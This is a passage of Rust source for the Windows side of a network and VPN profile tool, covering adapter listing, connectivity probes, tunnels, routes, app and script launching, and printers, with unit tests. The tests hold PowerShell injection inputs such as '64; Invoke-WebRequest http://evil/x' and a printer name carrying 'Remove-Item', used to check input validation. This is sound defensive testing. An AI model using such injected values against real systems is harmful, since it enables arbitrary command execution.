    /// 会把真正的口淹掉，所以这里只留物理口和已经连上的（网桥、vEthernet 这类）。
    /// 一次 PowerShell 拿全部行；不套 `cached_nics`：编辑器刷新要看到刚插上扩展坞的口。
    fn list_adapters(&self) -> Vec<super::NicInfo> {
        const ADAPTER_ROWS_PS: &str = r#"$ErrorActionPreference='SilentlyContinue';
$phys = New-Object System.Collections.Generic.HashSet[int];
foreach ($n in @(Get-NetAdapter -Physical)) { [void]$phys.Add($n.ifIndex) };
$list = New-Object System.Collections.Generic.List[object];
foreach ($n in @(Get-NetAdapter)) {
  $t = ("$($n.InterfaceDescription) $($n.Name)").ToLower();
  if (@($vpn | Where-Object { $t.Contains($_) }).Count -gt 0) { continue };
  if ($n.Status -ne 'Up' -and -not $phys.Contains($n.ifIndex)) { continue };
  $list.Add([pscustomobject]@{ name=$n.Name; desc=$n.InterfaceDescription; mac=$n.MacAddress; media=$n.MediaType; status=$n.Status });
};
if ($list.Count -eq 0) { '[]' } else { $list | ConvertTo-Json -Compress }"#;

        let needles: Vec<&str> = super::VPN_APP_TABLE.iter().map(|(needle, _)| *needle).collect();
        let script = format!("$vpn={};\n{}", ps_arr(&needles), ADAPTER_ROWS_PS);
        let Ok(raw) = ps(&script) else {
            return Vec::new();
        };
        let Ok(v) = serde_json::from_str::<serde_json::Value>(raw.trim()) else {
            return Vec::new();
        };
        // 只有一个口时 PowerShell 把数组退化成单个对象，与 list_interfaces 同一处理
        let rows: Vec<&serde_json::Value> = match &v {
            serde_json::Value::Array(a) => a.iter().collect(),
            other => vec![other],
        };
        let get = |r: &serde_json::Value, k: &str| -> String {
            r.get(k)
                .and_then(|x| x.as_str())
                .unwrap_or("")
                .trim()
                .to_string()
        };
        let mut out: Vec<super::NicInfo> = rows
            .into_iter()
            .filter(|r| !get(r, "name").is_empty())
            .map(|r| {
                let name = get(r, "name");
                let desc = get(r, "desc");
                let mac = get(r, "mac");
                super::NicInfo {
                    kind: kind_from_row(&get(r, "media"), &desc, &name),
                    up: get(r, "status").eq_ignore_ascii_case("Up"),
                    label: (!desc.is_empty()).then_some(desc),
                    mac: (!mac.is_empty()).then_some(mac),
                    name,
                    ..Default::default()
                }
            })
            .collect();
        // 名称字典序（Ethernet / Ethernet 2 / Wi-Fi）：类型分组是界面的事，下拉要稳定顺序
        out.sort_by(|a, b| a.name.cmp(&b.name));
        out
    }

    /// 系统的 UI 语言。`GetUserDefaultUILanguage` 给的是一个 LANGID：低 10 位是主语言，
    /// 高 6 位是子语言。只把这五种字典对得上的主语言翻成标签，其余（含读不到的 0）一律
    /// `None`，界面随后落回英文 —— 那正是没有对应字典时该有的行为。
    ///
    /// 之所以不走 PowerShell 问 `Get-WinSystemLocale`：那一下是秒级的子进程启动，而这一句
    /// 排在启动路径上，用户按完图标就该看到面板。
    fn ui_language(&self) -> Option<String> {
        use windows_sys::Win32::Globalization::GetUserDefaultUILanguage;
        let id = unsafe { GetUserDefaultUILanguage() };
        let primary = id & 0x03FF;
        let sub = id >> 10;
        let tag = match primary {
            // LANG_CHINESE。子语言 0x01=TW / 0x03=HK / 0x05=MO 是繁体，其余按简体。
            0x0004 if matches!(sub, 0x01 | 0x03 | 0x05) => "zh-TW",
            0x0004 => "zh-CN",
            // LANG_JAPANESE / LANG_KOREAN / LANG_ENGLISH
            0x0011 => "ja-JP",
            0x0012 => "ko-KR",
            0x0009 => "en-US",
            _ => return None,
        };
        Some(tag.to_string())
    }

    /// 深/浅读的是当前用户的 `AppsUseLightTheme`（「设置 → 个性化 → 颜色」那一个开关写的
    /// 就是它）。走 `reg.exe` 与开机启动那一条同一个形状：这一个键没有对应的 Win32 函数，
    /// 而它只在窗口加载与状态广播时被问一次，不值得为它扩 `windows-sys` 的 feature 面。
    ///
    /// 键名是**反着说**的（它问的是「用不用浅色」），所以判据放在共享的
    /// [`prefers_dark_from_reg`] 里由单元测试盯着：认不出输出形状时回 `None`，
    /// 而不是猜一档。
    fn ui_prefers_dark(&self) -> Option<bool> {
        let out = run(
            "reg.exe",
            &[
                "query",
                r"HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize",
                "/v",
                "AppsUseLightTheme",
            ],
        )
        .ok()?;
        prefers_dark_from_reg(&out)
    }

    fn probe(&self, target: &ProbeTarget, timeout_ms: u64) -> Health {
        use crate::config::ProbeMode;
        // Windows ping：-n 次数，-w 超时(毫秒)
        let icmp = || -> bool {
            let t = target.icmp_target.as_deref().unwrap_or("223.5.5.5");
            let ms = timeout_ms.max(1000).to_string();
            run("ping", &["-n", "1", "-w", &ms, t]).is_ok()
        };
        // curl.exe 自 Windows 10 1803 起内置
        let http = || -> bool {
            let url = match target.http_target.as_deref() {
                Some(u) if !u.is_empty() => u,
                _ => return false,
            };
            let secs = timeout_secs(timeout_ms);
            match run(
                "curl.exe",
                &[
                    "-sS", "-m", &secs, "-o", "NUL", "-w", "%{http_code}", url,
                ],
            ) {
                Ok(code) => matches!(code.trim().parse::<u16>(), Ok(c) if (200..400).contains(&c)),
                Err(_) => false,
            }
        };
        // TCP 端口探测：用 curl 的 TCP 连接能力
        let tcp = || -> bool {
            let t = match target.tcp_target.as_deref() {
                Some(s) if !s.is_empty() => s,
                _ => return false,
            };
            let secs = timeout_secs(timeout_ms);
            // curl --connect-only 只建 TCP 连接，不发请求
            run("curl.exe", &["-sS", "-m", &secs, "--connect-only", t]).is_ok()
        };
        // DNS 解析探测：用 nslookup
        let dns = || -> bool {
            let t = match target.dns_target.as_deref() {
                Some(s) if !s.is_empty() => s,
                _ => return false,
            };
            run("nslookup", &[t]).is_ok()
        };

        let dead = match target.mode {
            ProbeMode::Icmp => !icmp(),
            ProbeMode::Http => !http(),
            ProbeMode::Tcp => !tcp(),
            ProbeMode::Dns => !dns(),
            // both：只要任意一种探测通过就认为网络是通的
            ProbeMode::Both => !(icmp() || http() || tcp() || dns()),
        };
        if dead {
            Health::Fail
        } else {
            Health::Ok
        }
    }

    fn tunnel_is_up(&self, target: &TunnelTarget) -> bool {
        match win_adapter(target) {
            // 厂商提示在这里参与判定：Windows 看得见适配器描述，「名字对但厂商错」
            // 就该继续判为未连接，由 tunnel_connect 去解释
            Some(a) => a.up && a.provider_matched,
            None => false,
        }
    }

    /// ⚠️ 不提权：worker 每 N 秒就来一次，走 UAC 等于把桌面钉在授权弹窗上。
    /// Windows 上「装一条 WireGuard 隧道服务」本身就需要管理员权限，这里不假装能绕过，
    /// 而是把系统的原话交给界面 —— 用户看到就知道该手动做一次。
    fn tunnel_connect(&self, target: &TunnelTarget) -> Result<(), String> {
        let name = target.name();
        match win_adapter(target) {
            Some(a) if !a.provider_matched => Err(i18n::tf(
                "pal.iface_provider_mismatch",
                &[
                    ("name", &a.name),
                    ("desc", &a.desc),
                    ("provider", target.provider().unwrap_or("")),
                ],
            )),
            Some(a) if a.up => Ok(()),
            Some(_) => match target {
                TunnelTarget::WireGuard { .. } => connect_wireguard(name),
                TunnelTarget::Vpn { .. } => rasdial(name),
            },
            None => {
                let installed = wireguard_tunnel_names();
                if !installed.is_empty() {
                    Err(i18n::tf(
                        "pal.iface_missing_wg",
                        &[("name", name), ("conns", &installed.join(", "))],
                    ))
                } else {
                    Err(i18n::tf("pal.iface_missing_none", &[("name", name)]))
                }
            }
        }
    }

    fn add_route(&self, dest: &str, gw: &str, metric: u32) -> Result<(), String> {
        let iface = wifi_iface().ok_or_else(|| i18n::t("pal.no_wifi_iface"))?;
        exec_ops(&[WinOp::RouteAdd {
            iface,
            dest: dest.to_string(),
            gw: Some(gw.to_string()),
            metric,
        }])
    }

    fn delete_route(&self, dest: &str) -> Result<(), String> {
        exec_ops(&[WinOp::RouteDelete {
            dest: dest.to_string(),
        }])
    }

    fn launch_app(&self, app: &str, args: &[String]) -> Result<(), String> {
        let arg_list = if args.is_empty() {
            String::new()
        } else {
            let refs: Vec<&str> = args.iter().map(|s| s.as_str()).collect();
            format!(" -ArgumentList {}", ps_exec_arr(&refs))
        };
        // 走 PowerShell 的 Start-Process（不带 -Wait）：能起 exe / .lnk / 文档路径 / 协议，
        // 而且「起不来」会真的抛错。返回 0 的含义是**进程已经创建**，不是「应用还活着」——
        // 应用随后自己退出，这里也无从得知（三平台的 `launch_app` 都只到这个程度）。
        let script = format!(
            "$ErrorActionPreference='Stop'; Start-Process -FilePath {}{} | Out-Null",
            psq(app),
            arg_list
        );
        ps(&script).map(|_| ())
    }

    fn list_installed_apps(&self) -> Vec<AppEntry> {
        match ps(INSTALLED_APPS_PS) {
            Ok(out) => parse_installed_apps(&out),
            Err(e) => {
                // 空下拉对用户说的是「这台机器没装东西」，而真实原因可能是脚本起不来 ——
                // 与 list_printers 同一条决策：不弹框，只在日志里留下这个区别。
                crate::log::warn(&i18n::tf("logs.apps_failed", &[("error", &e)]));
                Vec::new()
            }
        }
    }

    fn pick_app(&self) -> Result<Option<String>, String> {
        let out = ps_sta(&pick_app_script(
            &i18n::t("pal.pick_app_title"),
            &i18n::t("pal.pick_app_filter"),
        ))?;
        let p = out.trim();
        Ok((!p.is_empty()).then(|| p.to_string()))
    }

    fn run_script(&self, path: &str, args: &[String], elevated: bool) -> Result<(), String> {
        // 按扩展名决定解释器：.ps1 → PowerShell；.bat/.cmd → cmd；其余直接执行
        let lower = path.to_ascii_lowercase();
        let (file, all_args): (String, Vec<String>) = if lower.ends_with(".ps1") {
            let mut a = vec![
                "-NoProfile".to_string(),
                "-ExecutionPolicy".to_string(),
                "Bypass".to_string(),
                "-File".to_string(),
                path.to_string(),
            ];
            a.extend(args.iter().cloned());
            ("powershell.exe".to_string(), a)
        } else if lower.ends_with(".bat") || lower.ends_with(".cmd") {
            let mut a = vec!["/c".to_string(), path.to_string()];
            a.extend(args.iter().cloned());
            ("cmd.exe".to_string(), a)
        } else {
            (path.to_string(), args.to_vec())
        };

        if elevated {
            // 用户脚本提权：显式走 UAC，确保用户每次知情（与网络配置操作区别对待），
            // 而且**只弹一次** —— 见 [`run_elevated_target`]。
            let refs: Vec<&str> = all_args.iter().map(|s| s.as_str()).collect();
            run_elevated_target(&file, &refs)
        } else {
            let refs: Vec<&str> = all_args.iter().map(|s| s.as_str()).collect();
            run(&file, &refs).map(|_| ())
        }
    }

    fn list_known_ssids(&self) -> Option<Vec<String>> {
        // 候选清单要报的是**空中那个名字**，不是 profile 名：用户在 VPN/路由器上看到的、
        // 条件里要写进配置的都是前者（`WLAN_SSID_MAP_PS` 说的是同一件事）。从前这里直接取
        // profile 的 `<name>`，于是「 2」被当成 SSID 的一部分列进了下拉框。
        //
        // 表是空的（读不动那个目录）才退回 profile 名：让下拉整个空掉是对一个查不到名字的
        // 机器撒谎，而这一列本来就一直是这个名字。条件仍可手输（#123 之后那格是可输入的）。
        let script = format!(
            "{}\n{}",
            WLAN_SSID_MAP_PS,
            r#"if ($wlanSsid.Count -gt 0) { @($wlanSsid.Values) | ConvertTo-Json -Compress }
elseif ($wlanNames.Count -gt 0) { @($wlanNames) | ConvertTo-Json -Compress }
else { '[]' }"#
        );
        let out = ps(&script).ok()?;
        let list = parse_ssid_values(&out);
        if list.is_empty() {
            None
        } else {
            Some(list)
        }
    }

    fn list_printers(&self) -> Vec<PrinterInfo> {
        match ps(PRINTER_ROWS_PS) {
            Ok(out) => parse_printer_rows(&out),
            Err(e) => {
                // 空下拉对用户说的是「没有打印机」，而真实原因可能是 CIM 查不动 ——
                // 这个区别只在日志里留得下，所以按用户既有的决策不弹框，只记一条。
                crate::log::warn(&i18n::tf("logs.printers_failed", &[("error", &e)]));
                Vec::new()
            }
        }
    }

    fn set_default_printer(&self, printer: &str) -> Result<(), String> {
        // `SetDefaultPrinter` 是**每用户**的设置，不需要管理员 —— 与 macOS/Linux 侧
        // 刻意选 `lpoptions -d` 是同一个决策：这个动作每次进入 Active 都会跑。
        ps(&set_default_printer_script(printer)).map(|_| ())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// CIM 打的是 .NET 布尔的 `True` / `False`；名字里带空格与反斜杠（网络共享打印机）
    /// 都必须原样留着 —— 那是用户接下来要写进配置里、下次下发要拿去找打印机的字符串。
    #[test]
    fn printer_rows_keep_the_exact_name_and_only_one_default() {
        let rows = parse_printer_rows(
            "Microsoft Print to PDF\tFalse\t\t\nHP OfficeJet Pro 476\tTrue\t476 on 3F\tOffice\n\\\\filesrv\\Lobby\tFalse\t\t前台\n",
        );
        assert_eq!(rows.len(), 3);
        assert_eq!(rows[1].name, "HP OfficeJet Pro 476");
        assert!(rows[1].is_default);
        assert!(!rows[0].is_default);
        assert_eq!(rows[2].name, r"\\filesrv\Lobby");
        assert!(!rows[2].is_default);
        // 备注与位置只给人看，队列名才是下发用的
        assert_eq!(rows[1].info.as_deref(), Some("476 on 3F · Office"));
        // 没有备注的那台：位置不能单独当名字，否则看着像另一台机器冒出来了
        assert_eq!(rows[2].info.as_deref(), Some(r"\\filesrv\Lobby · 前台"));
        assert_eq!(rows[0].info, None);
        // 没有 `\t` 的行（PowerShell 报错文本混进来时）与空名字的行都不该变成一条打印机
        assert!(parse_printer_rows("Get-CimInstance : Access denied\n\tTrue\n").is_empty());
        // 第二列不是 CIM 的布尔 → 这一行不是打印机
        assert!(parse_printer_rows("Some header column\tmaybe\t\n").is_empty());
    }

    /// 已装程序清单：两种 JSON 形状都收（单条记录时 PowerShell 把数组退成一个对象），
    /// 名字/路径为空的条目不要；同一路径只留一条。
    #[test]
    fn installed_apps_accept_both_json_shapes_and_drop_empties() {
        // 数组形状（两条；排序不区分大小写，Slack 在 Steam 前）
        let rows = parse_installed_apps(
            r#"[{"name":"Steam","path":"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Steam.lnk"},
                {"name":"Slack","path":"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Slack.lnk"}]"#,
        );
        assert_eq!(rows.len(), 2);
        assert_eq!(rows[0].name, "Slack");
        assert_eq!(rows[1].name, "Steam");
        // 单对象形状 —— ConvertTo-Json 对单元素数组的退化，不认它就会「装了 1 个程序时下拉全空」
        let one = parse_installed_apps(
            r#"{"name":"7-Zip File Manager","path":"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\7-Zip\\7-Zip File Manager.lnk"}"#,
        );
        assert_eq!(one.len(), 1);
        assert_eq!(one[0].name, "7-Zip File Manager");
        // 空清单 / 空输出 / 混进来的报错文本 → 空
        assert!(parse_installed_apps("[]").is_empty());
        assert!(parse_installed_apps("").is_empty());
        assert!(parse_installed_apps("Get-ChildItem : Access denied").is_empty());
        // 空名字、空路径、缺字段都不是一条能下发的候选
        assert!(parse_installed_apps(
            r#"[{"name":"","path":"C:\\a.lnk"},{"name":"x","path":"  "},{"name":"y"}]"#
        )
        .is_empty());
        // 同一路径出现两次只留一条（两个开始菜单根可能登记同一份快捷方式）
        let dup = parse_installed_apps(
            r#"[{"name":"WeChat","path":"C:\\a.lnk"},{"name":"WeChat","path":"C:\\a.lnk"}]"#,
        );
        assert_eq!(dup.len(), 1, "同一路径去重");
    }

    /// 网卡行的取舍规则。这条钉住的是用户报的那个现象：**没连上的虚拟网卡整批消失**
    /// （脚本按 `Status -eq 'Up'` 筛完，Rust 又要求「有 IPv4」）。
    ///
    /// 夹具刻意不带 `gw`：那一列会让我们去跑一次 `arp -a`，测试不该依赖邻居表。
    #[test]
    fn a_row_without_an_ipv4_still_counts_when_it_is_a_tunnel_or_has_some_address() {
        use serde_json::json;

        let wifi = nic_from_row(&json!({
            "name": "Wi-Fi", "desc": "Intel(R) Wi-Fi 6E AX211 160MHz",
            "status": "Up", "media": "Native 802.11", "ip": "192.168.1.23", "ssid": "Office_5G"
        }), &Default::default())
        .expect("在用的 Wi-Fi 必须在清单上");
        assert_eq!(wifi.kind, super::super::NicKind::Wireless);
        assert!(wifi.up);
        assert_eq!(wifi.ssid.as_deref(), Some("Office_5G"));

        // 没连上的隧道：一条地址都没有，但「装了没连」本身就是要看的信息
        let off = nic_from_row(&json!({
            "name": "Tailscale", "desc": "Tailscale Tunnel", "status": "Disconnected"
        }), &Default::default())
        .expect("未连接的 VPN 隧道也要列出来");
        assert_eq!(off.kind, super::super::NicKind::Vpn);
        assert!(!off.up, "状态要原样带出来，不能假称在用");
        assert_eq!(off.app.as_deref(), Some("Tailscale"));

        // IPv6-only：曾经因为「没有 IPv4」被丢掉
        let v6only = nic_from_row(&json!({
            "name": "Ethernet", "desc": "Realtek Gaming 2.5GbE", "status": "Up",
            "media": "802.3", "v6": "2001:db8::1"
        }), &Default::default())
        .expect("只有全局 IPv6 的网卡也是在用的");
        assert_eq!(v6only.ipv6.as_deref(), Some("2001:db8::1"));

        // v6 默认网关：真地址照收，`::`（on-link 伪值）不收 —— 面板的「网关 (IPv6)」
        // 那一行只在有真网关时才给你看。
        let v6gw = nic_from_row(&json!({
            "name": "Ethernet", "desc": "Realtek Gaming 2.5GbE", "status": "Up",
            "ip": "10.0.0.2", "gw6": "fe80::1"
        }), &Default::default())
        .expect("带 v6 网关的网卡");
        assert_eq!(v6gw.gateway6.as_deref(), Some("fe80::1"));
        let onlink = nic_from_row(&json!({
            "name": "WireGuard", "desc": "Wintun Userspace Tunnel", "status": "Up",
            "ip": "10.30.35.2", "gw6": "::"
        }), &Default::default())
        .expect("on-link 默认路由的隧道");
        assert_eq!(onlink.gateway6, None, "`::` 不是网关，别把它搬上界面");

        // 「网关或路由」那一格读的是 `routes`：键名两边各写一次（脚本里拼串、这里拆分），
        // 拼错了不会编译失败、只会静默变成空清单，所以这一条钉住这份契约，顺带钉住
        // 「逗号分隔、允许空格」这个约定。
        let routed = nic_from_row(&json!({
            "name": "WireGuard", "desc": "Wintun Userspace Tunnel", "status": "Up",
            "ip": "10.30.35.2", "routes": "0.0.0.0/0, 10.30.35.0/24,10.30.30.0/24"
        }), &Default::default())
        .expect("带路由的隧道");
        assert_eq!(
            routed.routes.join(","),
            "0.0.0.0/0,10.30.35.0/24,10.30.30.0/24"
        );

        // 上限只由 `MAX_ROUTES_PER_IFACE` 说了算（脚本那边不截）：`allowed-ips` 拆成
        // 一片 /32 时，多出来的前缀必须在这里被砍掉。
        let many: Vec<String> = (0..20).map(|i| format!("10.0.{i}.0/24")).collect();
        let capped = nic_from_row(&json!({
            "name": "WireGuard", "desc": "Wintun Userspace Tunnel", "status": "Up",
            "ip": "10.30.35.2", "routes": many.join(",")
        }), &Default::default())
        .expect("带路由的隧道");
        assert_eq!(capped.routes.len(), super::super::MAX_ROUTES_PER_IFACE);
        assert_eq!(capped.routes.last().map(String::as_str), Some("10.0.11.0/24"));

        // 没有地址、又不是隧道的行（WAN Miniport 那一类）不该占位
        assert!(nic_from_row(&json!({
            "name": "WAN Miniport (IP)", "desc": "WAN Miniport (IP)", "status": "Disconnected"
        }), &Default::default())
        .is_none());
        // 连名字都没有的行不是网卡，是脚本没吐全
        assert!(
            nic_from_row(&json!({ "status": "Up", "ip": "10.0.0.2" }), &Default::default())
                .is_none()
        );
    }

    /// 现连 SSID 认的是**空中那个名字**，profile 名只在 XML 里查不到时兜底。用户报的现象是
    /// SSID 后面凭空多出一个空格和数字 —— 那是 Windows 给重名 profile 加的消歧后缀，
    /// 而 `Get-NetConnectionProfile` 回答的正是 profile 名，不是这个网络在空中的名字。
    ///
    /// 这一条钉的是 XML 与 profile 名这两层；更硬的第三层（netsh 现场认领）见
    /// `the_live_claim_by_mac_beats_both_stored_names`。
    #[test]
    fn the_air_ssid_wins_over_the_profile_name() {
        use serde_json::json;
        let wifi = |ssid: Option<&str>, prof: Option<&str>| {
            let mut row = json!({
                "name": "Wi-Fi", "desc": "Intel(R) Wi-Fi 6E AX211 160MHz",
                "status": "Up", "media": "Native 802.11", "ip": "192.168.1.23"
            });
            // 查不到的那一列脚本吐 null，Rust 侧要当「没有」而不是空串
            let obj = row.as_object_mut().unwrap();
            obj.insert("ssid".into(), ssid.into());
            obj.insert("prof".into(), prof.into());
            nic_from_row(&row, &Default::default()).expect("在用的 Wi-Fi 必须在清单上")
        };
        assert_eq!(
            wifi(Some("Office_5G"), Some("Office_5G 2"))
                .ssid
                .as_deref(),
            Some("Office_5G"),
            "XML 里的真空名字优先，后缀版本不能出现在界面上"
        );
        assert_eq!(
            wifi(None, Some("Office_5G 2")).ssid.as_deref(),
            Some("Office_5G 2"),
            "XML 查不到时退回 profile 名：那是本函数从前唯一的来源，比空白强"
        );
        assert_eq!(
            wifi(Some(""), Some("Cafe")).ssid.as_deref(),
            Some("Cafe"),
            "空串等同于查不到"
        );
        // 非无线的行不认领 SSID：那一列是连接配置名（域名或工作组名），不是无线名字
        let wired = nic_from_row(&json!({
            "name": "Ethernet", "desc": "Realtek Gaming 2.5GbE", "status": "Up",
            "media": "802.3", "ip": "10.0.0.5", "ssid": "contoso", "prof": "contoso"
        }), &Default::default())
        .expect("在用的有线网卡必须在清单上");
        assert_eq!(wired.ssid, None);
    }

    /// 第三层来源：`netsh wlan show interfaces` 的现场数据，按网卡 MAC 认领。
    /// 它压过磁盘上的两个名字（profile XML 的空中名、profile 名）—— 那是「此刻关联」
    /// 对「曾经记住」。行里的 `mac` 是大写短横线（`$ad.MacAddress` 的本相），
    /// 表键是 `normalize_mac` 的形态，必须先归一化再查。
    #[test]
    fn the_live_claim_by_mac_beats_both_stored_names() {
        use serde_json::json;
        let row = |mac: &str, ssid: Option<&str>, prof: Option<&str>| {
            let mut r = json!({
                "name": "Wi-Fi", "desc": "Intel(R) Wi-Fi 6E AX211 160MHz",
                "status": "Up", "media": "Native 802.11", "ip": "192.168.1.23", "mac": mac
            });
            let obj = r.as_object_mut().unwrap();
            obj.insert("ssid".into(), ssid.into());
            obj.insert("prof".into(), prof.into());
            r
        };
        let claim: std::collections::BTreeMap<String, String> =
            [("f0:2f:74:1a:2b:3c".to_string(), "MyWiFi".to_string())]
                .into_iter()
                .collect();
        let ssid_of = |r: &serde_json::Value| {
            nic_from_row(r, &claim)
                .expect("在用的 Wi-Fi 必须在清单上")
                .ssid
        };

        // 用户报的现场：任务栏是 `MyWiFi 3`，netsh 说关联的是 `MyWiFi`
        assert_eq!(
            ssid_of(&row("F0-2F-74-1A-2B-3C", None, Some("MyWiFi 3"))).as_deref(),
            Some("MyWiFi"),
            "现场报的名字压过 NLA 的消歧后缀"
        );
        // 现场压过 XML：连接态以此刻关联为准（XML 里可能是改过 SSID 的存量配置）
        assert_eq!(
            ssid_of(&row("F0-2F-74-1A-2B-3C", Some("OldName"), Some("OldName 2"))).as_deref(),
            Some("MyWiFi"),
            "现场认得这张卡时，磁盘上的两个名字都让位"
        );
        // 这张口没被认领 —— 别人的认领不能落到它头上，退回 XML
        assert_eq!(
            ssid_of(&row("10-7B-44-9E-0F-A1", Some("Cafe"), Some("Cafe 2"))).as_deref(),
            Some("Cafe"),
            "MAC 不匹配的认领不适用于本行"
        );
        // 没被认领且 XML 也查不到：最弱的一层照旧兜底
        assert_eq!(
            ssid_of(&row("10-7B-44-9E-0F-A1", None, Some("Cafe 2"))).as_deref(),
            Some("Cafe 2"),
            "三层都给不出名字时才退回 profile 名"
        );
    }

    /// `netsh wlan show interfaces` 的文本解析：认领按每段接口块里**第一个** MAC 串
    /// （`物理地址` 行）算；BSSID 行带着 `BSSID` 字样不参与，两张无线网卡不会互认。
    /// 夹具就用用户报的现场：空中是 `MyWiFi`，`配置文件` 行是 NLA 的 `MyWiFi 3`。
    ///
    /// 值里的 `U+FFFD` 是「这段值不全是 ASCII」的信号（[`run`] 按 UTF-8 解 OEM
    /// 代码页的字节）：宁可整条丢掉、退回 XML，也不显示一个可能已解坏的名字。
    #[test]
    fn netsh_blocks_attribute_each_air_ssid_to_its_own_interface() {
        let text = "\
接口名称           : Wi-Fi
描述               : Intel(R) Wi-Fi 6E AX211 160MHz
GUID               : 3f5b1a2c-9d4e-4a7b-8c1d-2e3f40516273
物理地址           : F0-2F-74-1A-2B-3C
状态               : 已连接
SSID               : MyWiFi
BSSID              : E8-84-C6-93-AD-EB
网络类型           : 结构
配置文件           : MyWiFi 3

接口名称           : 以太网 2
描述               : Realtek USB GbE Family Controller
物理地址           : 02-00-54-55-4E-01
状态               : 已断开

接口名称           : Wi-Fi 2
描述               : MediaTek Wi-Fi 6 MT7921
物理地址           : 10-7B-44-9E-0F-A1
状态               : 已连接
SSID               : Lab:5G
BSSID              : 60-32-B9-00-AA-BB
配置文件           : Lab

接口名称           : Wi-Fi 3
描述               : Intel(R) Wi-Fi 6E AX211 160MHz
物理地址           : 3C-58-C2-11-22-33
状态               : 已连接
SSID               : \u{fffd}\u{fffd}的网络
BSSID              : 60-32-B9-00-AA-CC
配置文件           : 中文网络

";
        let map = netsh_ssids_by_mac(text);
        assert_eq!(
            map.get("f0:2f:74:1a:2b:3c").map(String::as_str),
            Some("MyWiFi"),
            "`配置文件` 行的 `MyWiFi 3` 是 NLA 名字，不是空中的 SSID"
        );
        assert!(
            !map.contains_key("e8:84:c6:93:ad:eb"),
            "BSSID 是邻居的 MAC，不能成为认领的键"
        );
        assert!(
            !map.contains_key("02:00:54:55:4e:01"),
            "断开的接口没有 SSID 行，不该产生条目"
        );
        assert_eq!(
            map.get("10:7b:44:9e:0f:a1").map(String::as_str),
            Some("Lab:5G"),
            "SSID 里本来就有冒号时只切第一个，值要整个留下"
        );
        assert!(
            !map.contains_key("3c:58:c2:11:22:33"),
            "值里出现 U+FFFD 说明 OEM 解码可能已解坏：整条丢掉，让调用方退回 XML"
        );
        assert_eq!(map.len(), 2);
    }

    /// 多张 Wi-Fi 网卡时，BSSID / 信号必须跟着本机 MAC 走，不能取「全文最后一个 BSSID /
    /// 第一个 %」—— 否则 BSSID 会串到另一张卡上（审计 W5）。
    #[test]
    fn bssid_rssi_follow_the_same_mac_block_not_the_last_in_text() {
        let text = "\
接口名称           : Wi-Fi
物理地址           : F0-2F-74-1A-2B-3C
状态               : 已连接
SSID               : MyWiFi
BSSID              : E8-84-C6-93-AD-EB
信号               : 87%

接口名称           : Wi-Fi 2
物理地址           : 10-7B-44-9E-0F-A1
状态               : 已连接
SSID               : Lab:5G
BSSID              : 60-32-B9-00-AA-BB
信号               : 41%

";
        let (b1, r1) = netsh_bssid_rssi_for_mac(text, "f0:2f:74:1a:2b:3c");
        assert_eq!(b1.as_deref(), Some("e8:84:c6:93:ad:eb"));
        assert_eq!(r1, Some(87 / 2 - 100));
        // 第二张卡：BSSID / 信号取它自己那一块，而不是全文最后一个
        let (b2, r2) = netsh_bssid_rssi_for_mac(text, "10:7b:44:9e:0f:a1");
        assert_eq!(b2.as_deref(), Some("60:32:b9:00:aa:bb"));
        assert_eq!(r2, Some(41 / 2 - 100));
        // 不存在的 MAC：两样都拿不到
        assert_eq!(netsh_bssid_rssi_for_mac(text, "de:ad:be:ef:00:00"), (None, None));
    }

    /// `list_known_ssids` 交回来的 JSON 有两种形状（只有一条记录时 PowerShell 不吐数组），
    /// 而空白值进了下拉框就是一条选不中、也没法向用户解释的行。
    #[test]
    fn known_ssids_are_trimmed_sorted_and_deduped_whatever_shape_ps_returns() {
        assert_eq!(
            parse_ssid_values("[\"B\",\" A \",\"B\",\"\",\"\\t\"]"),
            vec!["A".to_string(), "B".to_string()]
        );
        assert_eq!(
            parse_ssid_values("\"OnlyOne\""),
            vec!["OnlyOne".to_string()]
        );
        assert!(parse_ssid_values("[]").is_empty());
        assert!(parse_ssid_values("null").is_empty());
        // 脚本报错时吐的是文本而不是 JSON：那种情况下宁可少一个下拉，不要一排乱码
        assert!(parse_ssid_values("Get-ChildItem : Access to the path was denied").is_empty());
    }

    /// 打印机名是一段自由文本，而这里要把它交进一段 PowerShell 里。它只能出现在
    /// `$want` 那一个单引号字面量内，且内部的 `'` 必须被翻倍 —— 否则一份 config.json
    /// 就是任意命令执行。
    #[test]
    fn a_printer_name_cannot_close_its_own_quotes() {
        let s = set_default_printer_script(r"O'Brien's 'HP; Remove-Item x");
        assert!(s.contains(r"$want='O''Brien''s ''HP; Remove-Item x';"), "{s}");
        // 比较是在对象上做的，不是拼进 WQL 的 -Filter
        assert!(!s.contains("-Filter"), "{s}");
        assert!(s.contains("-eq $want"), "{s}");
        // 两种失败都得用非 0 退出码说话，否则「打印机没换成」会被记成动作成功
        assert!(s.contains("exit 3") && s.contains("exit 4"), "{s}");
    }

    /// 两个数组构造器**故意**长得不一样，这条测试就是不让它们被"顺手统一"掉：
    /// `& netsh.exe @(...)` 由 PowerShell 自己补引号，而 `Start-Process -ArgumentList @(...)`
    /// 只是把元素用空格拼成一条命令行 —— 那边重复加引号会改变参数，不加引号会把带空格的路径拆开。
    #[test]
    fn start_process_arguments_carry_their_own_shell_quotes() {
        assert_eq!(ps_arr(&["/c", r"C:\a b.bat", "-z"]), r"@('/c','C:\a b.bat','-z')");
        assert_eq!(
            ps_exec_arr(&["/c", r"C:\a b.bat", "-z"]),
            r#"@('/c','"C:\a b.bat"','-z')"#
        );
        // 不带空白的元素不该被多包一层（netsh 一类工具会把引号算进值里）
        assert_eq!(ps_exec_arr(&["name=Wi-Fi"]), "@('name=Wi-Fi')");
    }

    #[test]
    fn prefix_len_accepts_integers_only() {
        assert_eq!(parse_prefix_len("64").unwrap(), "64");
        assert_eq!(parse_prefix_len(" 8 ").unwrap(), "8");
        assert_eq!(parse_prefix_len("0").unwrap(), "0");
        assert_eq!(parse_prefix_len("128").unwrap(), "128");
    }

    #[test]
    fn prefix_len_rejects_injection_and_out_of_range() {
        // 关键：这些一旦原样进 `-PrefixLength`，等价于 PowerShell 语句注入
        for bad in [
            "64; Invoke-WebRequest http://evil/x",
            "64\nGet-Process",
            "64$(calc)",
            "",
            "abc",
            "129",
            "-1",
        ] {
            assert!(parse_prefix_len(bad).is_err(), "accepted bad prefix: {:?}", bad);
        }
    }

